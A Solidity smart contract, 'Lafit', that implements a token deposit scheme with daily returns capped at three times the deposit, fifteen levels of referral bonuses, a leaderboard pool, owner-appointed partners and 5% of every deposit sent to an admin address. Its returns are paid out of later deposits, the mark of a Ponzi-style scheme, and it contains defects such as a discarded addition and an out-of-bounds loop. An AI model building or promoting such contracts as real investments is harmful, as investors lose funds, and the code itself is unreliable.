//SourceUnit: Lafit.sol

pragma solidity ^0.5.10;

contract IToken{

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}

contract Lafit{
  using SafeMath for uint256;

  struct Deposit {
    uint256 amount;
    uint256 withdrawn;
    uint256 start;
  }

  struct User {
    Deposit[] deposits;
    uint256 checkpoint;
    address upline;
    uint256 bonus;
    uint256 referrals;
    uint256 totalStructure;
    uint256 poolBonus;
    uint256 directBonus;
    uint256 partnerBonus;
    uint256 partnerBonusTotal;
    uint256 partnerAmount;
    uint256 partnerWithdrawn;
    uint256 threeLevelPerformance;
    uint256 userTotalWithdraw;
    bool isPartner;
  }

  IToken token;
  address owner;

  uint256  internal decimal = 10 ** 6;
  uint256 internal MIN_INVESTMENT = 200 * decimal;

  uint256 constant public BASE_PERCENT = 10;
  uint256 constant public DIRECT_BONUS_PERCENT = 100;
  uint256 constant public POOL_PERCENT = 950;
  uint256 constant public REWARD_PERCENT = 24;
  uint256[] public REFERRAL_PERCENTS = [300,300,300,100,100,100,100,80,80,80,80,50,50,50,50];
  uint256 constant public ADMIN_FEE = 50;
  uint256 constant public PARTNER_FEE = 50;
  uint256 constant public PERCENTS_DIVIDER = 1000;
  uint256  public CONTRACT_BALANCE_STEP = 2000000 * decimal;
  uint256  public CONTRACT_BALANCE_STEP_SECOND = 5000000 * decimal;
  uint256 constant public TIME_STEP = 1 days;

  uint256 public totalUsers;
  uint256 public totalInvested;
  uint256 public totalWithdrawn;
  uint256 public totalDeposits;
  address private  adminAddr;


  mapping (address => User) internal users;


  uint8[] public  pool_bonuses;
  uint40 public pool_last_draw = uint40(block.timestamp);
  uint256 public pool_cycle;
  uint256 public pool_balance;
  uint256 public pool_balance_total;
  mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
  mapping(uint8 => address) public pool_top;

  address[] public bigPartnerAddr;
  address[] public smallPartnerAddr;
  uint256 public partnerPoolBalance;
  uint40 public partnerLastBonus = uint40(block.timestamp);
  uint40 public partnerLastAssessment = uint40(block.timestamp);


  event NewUser(address user);
  event RefBonus(address up,address _addr,uint256 bonus);
  event NewDeposit(address indexed user, uint256 amount);
  event Withdrawn(address indexed user, uint256 amount);
  event RefBonus(address indexed upline, address indexed referral, uint256 indexed level, uint256 amount);
  event FeePayed(address indexed user, uint256 totalAmount);
  event PoolPayout(address indexed addr, uint256 amount);

  constructor(IToken _token,address _adminAddr) public payable{
    owner = msg.sender;
    token = _token;
    adminAddr =_adminAddr;
    pool_bonuses.push(40);
    pool_bonuses.push(30);
    pool_bonuses.push(20);
    pool_bonuses.push(10);
  }
  function() external payable{}

  function invest(address _upline,uint256 amount) public {
    require(amount >= MIN_INVESTMENT,'The investment amount is wrong');
    if(totalInvested < (1e7 * decimal)){
      require(amount <= (1e4 * decimal) ,'The investment amount must be less than 10,000');
    }
    if(totalInvested >=(1e7 * decimal) && totalInvested< (2e7 * decimal)){
      require(amount <= (5e4 * decimal) ,'The investment amount must be less than 50,000');
    }
    require(!isActive(msg.sender),'Deposit already exists');
    require(token.balanceOf(msg.sender) >= amount, 'Your balance is insufficient');
    User storage user = users[msg.sender];
    if(user.deposits.length>0){
      Deposit memory d = user.deposits[user.deposits.length-1];
      require(amount >d.amount ,'The investment amount must be greater than the last time');
    }
    uint256 tt = amount.mul(POOL_PERCENT).div(PERCENTS_DIVIDER);
    token.transferFrom(msg.sender,adminAddr, amount.sub(tt));
    bool res = token.transferFrom(msg.sender,address(this), tt);
    require(res,'transferFrom excute faild');

    if (user.upline == address(0) && users[_upline].deposits.length > 0 && _upline != msg.sender) {
      user.upline = _upline;
    }

    address up = user.upline;
    if (user.upline != address(0)) {
      users[up].directBonus += (amount.mul(DIRECT_BONUS_PERCENT).div(PERCENTS_DIVIDER));
    }

    user.checkpoint = block.timestamp;
    if (user.deposits.length == 0) {
      totalUsers = totalUsers.add(1);
      users[up].referrals++;

      for(uint8 i = 0; i < REFERRAL_PERCENTS.length; i++) {
        if(up == address(0)) break;
        users[up].totalStructure++;
        up = users[up].upline;
      }
      emit NewUser(msg.sender);
    }

    user.deposits.push(Deposit(amount, 0, block.timestamp));
    totalInvested = totalInvested.add(amount);
    totalDeposits = totalDeposits.add(1);

    address u = user.upline;
    for(uint8 i=0;i<3;i++){
      if(u==address(0)) break;
      users[u].threeLevelPerformance += amount;
      u= users[u].upline;
    }
    pollDeposits(msg.sender, amount);
    if(pool_last_draw + TIME_STEP < block.timestamp) {
      drawPool();
    }
    if(partnerLastBonus + (10*60*60) < block.timestamp){
      drawPartnerBonus();
    }
    partnerPoolBalance += (amount * 5/100);
    emit NewDeposit(msg.sender, amount);
  }

  function bigPartnerAssessment() private{
    address  addr0 = bigPartnerAddr[0];
    uint performance0 = users[addr0].threeLevelPerformance;
    users[addr0].isPartner = true;

    for(uint8 i=1;i < bigPartnerAddr.length;i++){
      address userAddr = bigPartnerAddr[i];
      users[userAddr].isPartner = true;
      uint performance  = users[userAddr].threeLevelPerformance;
      if(performance < performance0){
        addr0 = userAddr;
        performance0 = performance;
      }
    }
    users[addr0].isPartner = false;
  }
  function smallPartnerAssessment() private{
    address  addr0 = smallPartnerAddr[0];
    uint performance0 = users[addr0].threeLevelPerformance;
    users[addr0].isPartner = true;

    for(uint8 i=1;i < smallPartnerAddr.length;i++){
      address userAddr = smallPartnerAddr[i];
      users[userAddr].isPartner = true;
      uint performance  = users[userAddr].threeLevelPerformance;
      if(performance < performance0){
        addr0 = userAddr;
        performance0 = performance;
      }
    }
    users[addr0].isPartner = false;
  }
  function drawPartnerBonus() private{
    if(partnerLastAssessment + 30 days < block.timestamp){
      bigPartnerAssessment();
      smallPartnerAssessment();
      partnerLastAssessment = uint40(block.timestamp);
    }
    uint256 bigTotalPerformance;
    uint256 bigActuMembers ;
    uint256 smallTotalPerformance;
    uint256 smallActuMembers ;

    for(uint8 i=0;i<bigPartnerAddr.length;i++){
      User storage user  = users[bigPartnerAddr[i]];
      if(user.isPartner){
        bigTotalPerformance += user.threeLevelPerformance;
        bigActuMembers++;
      }
    }
    for(uint8 i=0;i<bigPartnerAddr.length;i++){
      User storage user  = users[bigPartnerAddr[i]];
      if(user.isPartner){
        uint256 half = partnerPoolBalance*60/100/2;
        user.partnerBonus += (half/bigActuMembers + half*user.threeLevelPerformance/bigTotalPerformance);
      }
    }

    for(uint8 i=0;i<smallPartnerAddr.length;i++){
      User storage user  = users[smallPartnerAddr[i]];
      if(user.isPartner){
        smallTotalPerformance += user.threeLevelPerformance;
        smallActuMembers++;
      }
    }

    for(uint8 i=0;i<smallPartnerAddr.length;i++){
      User storage user  = users[smallPartnerAddr[i]];
      if(user.isPartner){
        uint256 half = partnerPoolBalance*40/100/2;
        user.partnerBonus += (half/smallActuMembers + half*user.threeLevelPerformance/smallTotalPerformance);
      }
    }

    partnerLastBonus=uint40(block.timestamp);
    partnerPoolBalance = 0;
  }


  function pollDeposits(address _addr, uint256 _amount) private {
    pool_balance += _amount * 24 / 1000;
    pool_balance_total += pool_balance;
    User memory user = users[_addr];
    address upline = user.upline;

    if(upline == address(0)) return;

    for(uint8 m=0;m<3;m++){
      if(upline == address(0)) break;

      pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

      for(uint8 i = 0; i < pool_bonuses.length; i++) {
        if(pool_top[i] == upline) break;

        if(pool_top[i] == address(0)) {
          pool_top[i] = upline;
          break;
        }

        if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
          for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
            if(pool_top[j] == upline) {
              for(uint8 k = j; k <= pool_bonuses.length; k++) {
                pool_top[k] = pool_top[k + 1];
              }
              break;
            }
          }

          for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
            pool_top[j] = pool_top[j - 1];
          }

          pool_top[i] = upline;

          break;
        }
      }
      upline=users[upline].upline;
    }
  }

  function drawPool() private {
    pool_last_draw = uint40(block.timestamp);
    pool_cycle++;

    for(uint8 i = 0; i < pool_bonuses.length; i++) {
      if(pool_top[i] == address(0)) break;

      uint256 win = pool_balance * pool_bonuses[i] / 100;

      users[pool_top[i]].poolBonus += win;
      pool_balance -= win;

      emit PoolPayout(pool_top[i], win);
    }

    for(uint8 i = 0; i < pool_bonuses.length; i++) {
      pool_top[i] = address(0);
    }
  }

  function refBonus(address _addr, uint256 _amount) private {
    address up = users[_addr].upline;

    for(uint8 i = 0; i < REFERRAL_PERCENTS.length; i++) {
      if(up == address(0)) break;

      if(users[up].referrals >= i + 1) {
        uint256 bonus = _amount * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;

        users[up].bonus += bonus;

        emit RefBonus(up, _addr, bonus);
      }
      up = users[up].upline;
    }
  }

  function withdraw() public returns (bool){
    if(pool_last_draw + TIME_STEP < block.timestamp) {
      drawPool();
    }
    if(partnerLastBonus + (10*60*60) < block.timestamp){
      drawPartnerBonus();
    }
    User storage user = users[msg.sender];
    require(user.deposits.length>0,'you have not invested');
    Deposit storage deposit = user.deposits[user.deposits.length-1];
    uint256 maxPayOut = deposit.amount.mul(3);
    require( deposit.withdrawn < maxPayOut, "User has no dividends");
    uint256 userPercentRate = getUserPercentRate();

    uint256 totalAmount;
    uint256 dividends =  (deposit.amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
    .mul(block.timestamp.sub(user.checkpoint))
    .div(TIME_STEP);
    if((deposit.withdrawn + dividends)>maxPayOut){
      dividends = maxPayOut.sub(deposit.withdrawn);
    }
    if(dividends > 0){
      deposit.withdrawn += dividends;
      totalAmount += dividends;
      refBonus(msg.sender,dividends);
    }

    if(deposit.withdrawn < maxPayOut && user.directBonus>0){
     uint256 directBonus = user.directBonus;
      if(deposit.withdrawn + directBonus > maxPayOut){
          directBonus = maxPayOut - deposit.withdrawn;
      }
      user.directBonus -= directBonus;
      deposit.withdrawn +=  directBonus;
      totalAmount +=  directBonus;
    }

    if(deposit.withdrawn < maxPayOut && user.bonus >0){
      uint256 bonus = user.bonus;
      if(deposit.withdrawn + bonus >maxPayOut){
        bonus = maxPayOut - deposit.withdrawn;
      }
      user.bonus -= bonus;
      deposit.withdrawn +=  bonus;
      totalAmount +=  bonus;
    }

    if(deposit.withdrawn < maxPayOut && user.poolBonus >0){
      uint256  poolBonus = user.poolBonus;
      if(deposit.withdrawn + poolBonus> maxPayOut){
        poolBonus = maxPayOut - deposit.withdrawn;
      }
      user.poolBonus -= poolBonus;
      deposit.withdrawn +=  poolBonus;
      totalAmount +=  poolBonus;
    }

    if(user.isPartner && user.partnerBonus > 0){
      totalAmount += user.partnerBonus;
      user.partnerBonusTotal += user.partnerBonus;
      user.partnerBonus = 0;
    }


    uint256 partnerRealese = (user.partnerAmount.mul(userPercentRate).div(PERCENTS_DIVIDER))
    .mul(block.timestamp.sub(user.checkpoint))
    .div(TIME_STEP);
    if(user.partnerWithdrawn + partnerRealese > user.partnerAmount){
      partnerRealese = user.partnerAmount.sub(user.partnerWithdrawn);
    }
    user.partnerWithdrawn += partnerRealese;
    totalAmount.add(partnerRealese);

    bool res = token.transfer(msg.sender,totalAmount);
    require(res,'withdraw failed');
    user.userTotalWithdraw += totalAmount;
    totalWithdrawn = totalWithdrawn.add(totalAmount);
    user.checkpoint = block.timestamp;
    emit Withdrawn(msg.sender, totalAmount);
    return true;
  }

  function getUserDividends(address userAddress) public view returns (uint256) {
    User storage user = users[userAddress];
    Deposit storage deposit = user.deposits[user.deposits.length-1];
    uint256 maxPayOut = deposit.amount.mul(3);
    uint256 userPercentRate = getUserPercentRate();

    uint256 dividends;

    //static
    dividends =  (deposit.amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
    .mul(block.timestamp.sub(user.checkpoint))
    .div(TIME_STEP);
    if((deposit.withdrawn + dividends) > maxPayOut){
      dividends = maxPayOut.sub(deposit.withdrawn);
    }
    return dividends;
  }

  function getUserCheckpoint(address userAddress) public view returns(uint256) {
    return users[userAddress].checkpoint;
  }

  function getUserUpline(address userAddress) public view returns(address) {
    return users[userAddress].upline;
  }


  function getUserReferralBonus(address userAddress) public view returns(uint256) {
    return users[userAddress].bonus;
  }

  function getUserpoolBonus(address userAddress) public view returns(uint256) {
    return users[userAddress].poolBonus;
  }

  function getUserDirectBonus(address userAddress) public view returns(uint256) {
    return users[userAddress].directBonus;
  }

  function userUnWithdraw(address userAddress) public view returns(uint256 data) {
    User storage user = users[userAddress];
    if(user.deposits.length==0){
      return 0;
    }

    Deposit storage deposit = user.deposits[user.deposits.length-1];
    uint256 maxPayOut = deposit.amount.mul(3);

    uint256 dividends = getUserDividends(userAddress);
    uint256 referralBonus = getUserReferralBonus(userAddress);
    uint256 directBonus = getUserDirectBonus(userAddress);
    uint256 poolBonus = getUserpoolBonus(userAddress);

    uint256 result = dividends + referralBonus + directBonus + poolBonus ;

    if(result + deposit.withdrawn > maxPayOut){
      result = maxPayOut.sub(deposit.withdrawn);
    }
    if(user.isPartner){
      result += user.partnerBonus;
    }
    return result;
  }

  function isActive(address userAddress) public view returns (bool) {
    User storage user = users[userAddress];

    if (user.deposits.length > 0) {
      if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(3)) {
        return true;
      }
    }
  }

  function getUserDepositInfoByIndex(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
    User storage user = users[userAddress];
    return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
  }

  function getUserTotalInvestAndWithdrawnForDeposits(address userAddress) public view returns(uint8,uint256,uint256) {
    User storage user = users[userAddress];
    uint256 totalAmountForDeposits;
    uint256 totalWithdrawnForDeposits;
    for (uint256 i = 0; i < user.deposits.length; i++) {
      totalAmountForDeposits = totalAmountForDeposits.add(user.deposits[i].amount);
      totalWithdrawnForDeposits = totalWithdrawnForDeposits.add(user.deposits[i].withdrawn);
    }
    return (uint8(user.deposits.length),totalAmountForDeposits,totalWithdrawnForDeposits);
  }

  function userInfo1(address _addr) view external returns (uint256 checkpoint,address upline,uint256 referrals,uint256 totalStructure){
    User memory user = users[_addr];
    return (user.checkpoint,user.upline,user.referrals,user.totalStructure);
  }

  function userInfo2(address _addr) view external returns (uint256 poolBonus,uint256 directBonus,uint256 partnerBonus,uint256 threeLevelPerformance,uint256 userTotalWithdraw){
    User memory user = users[_addr];
    return (user.poolBonus,user.directBonus,user.partnerBonus,user.threeLevelPerformance,user.userTotalWithdraw);
  }

  function userInfo3(address _addr) view external returns (uint256 bonus,uint256 partnerBonusTotal,uint256 partnerAmount,uint256 partnerWithdrawn,bool isPartner){
    User memory user = users[_addr];
    return (user.bonus,user.partnerBonusTotal,user.partnerAmount,user.partnerWithdrawn,user.isPartner);
  }

  function contractInfo() view external returns (uint256 _totalUsers,uint256 _totalInvested,uint256 _totalWithdrawn,uint256 _totalDeposits,uint256 _pool_last_draw,uint256 _pool_balance,uint256 _pool_balance_total,uint256 _topReffer){
    return (totalUsers,totalInvested,totalWithdrawn,totalDeposits,pool_last_draw,pool_balance,pool_balance_total,pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
  }

  function addPartner(address addr,uint8 type_big1small2) public onlyOwner returns (bool){
    require(users[addr].deposits.length != 0,' this address is not in users');
    require((type_big1small2==1 || type_big1small2==2),'type_big1small2 must be 1 or 2' );

    bool isExist =false;
    for(uint8 i =0;i<bigPartnerAddr.length;i++){
      if(bigPartnerAddr[i]==addr){
        isExist =true;
      }
    }

    for(uint8 i =0;i<smallPartnerAddr.length;i++){
      if(smallPartnerAddr[i]==addr){
        isExist =true;
      }
    }
    require(!isExist,'this address already exists ');
    if(type_big1small2==1){
      bigPartnerAddr.push(addr);
      users[addr].partnerAmount = 90000* decimal;
    }else if(type_big1small2==2){
      smallPartnerAddr.push(addr);
      users[addr].partnerAmount=30000* decimal;
    }
    users[addr].isPartner =true;
    return true;
  }

  function delPartner(address addr) public onlyOwner returns(bool){
    for(uint8 i =0;i<bigPartnerAddr.length;i++){
      if(bigPartnerAddr[i]==addr){
        delete bigPartnerAddr[i];
        for(uint8 j = i; j<bigPartnerAddr.length-1;j++){
          bigPartnerAddr[j]=bigPartnerAddr[j+1];
        }
        delete bigPartnerAddr[bigPartnerAddr.length-1];
        bigPartnerAddr.length--;
        users[addr].isPartner=false;
      }
    }

    for(uint8 i =0;i<smallPartnerAddr.length;i++){
      if(smallPartnerAddr[i]==addr){
        delete smallPartnerAddr[i];
        for(uint8 j = i; j<smallPartnerAddr.length-1;j++){
          smallPartnerAddr[j]=smallPartnerAddr[j+1];
        }
        delete smallPartnerAddr[smallPartnerAddr.length-1];
        smallPartnerAddr.length--;
        users[addr].isPartner=false;
      }
    }

  }

  function isContract(address addr) internal view returns (bool) {
    uint size;
    assembly { size := extcodesize(addr) }
    return size > 0;
  }

  function getPoolBalance() internal view returns (uint256) {
    return totalInvested <= totalWithdrawn?0:totalInvested.sub(totalWithdrawn);
  }

  function getUserPercentRate() public view returns (uint256) {
    uint256 contractBalance = getPoolBalance();
    if(contractBalance>(1e7 * decimal) && contractBalance<(5e7 * decimal) ){
      uint256 f = contractBalance.sub(1e7 * decimal);
      uint256 m =  (f+ CONTRACT_BALANCE_STEP -1 )/CONTRACT_BALANCE_STEP;
      m = m<=90 ? m :90;
      return BASE_PERCENT.add(m);
    }
    if(contractBalance > (5e7 * decimal) ){
      uint256 f = contractBalance.sub(5e7 * decimal);
      uint256 m =  (f+ CONTRACT_BALANCE_STEP_SECOND -1 )/CONTRACT_BALANCE_STEP_SECOND;
      m = m<=90 ? m :90;
      return BASE_PERCENT.add(m);
    }
    return BASE_PERCENT;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}



library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath: subtraction overflow");
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0, "SafeMath: division by zero");
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0, "SafeMath: modulo by zero");
    return a % b;
  }
}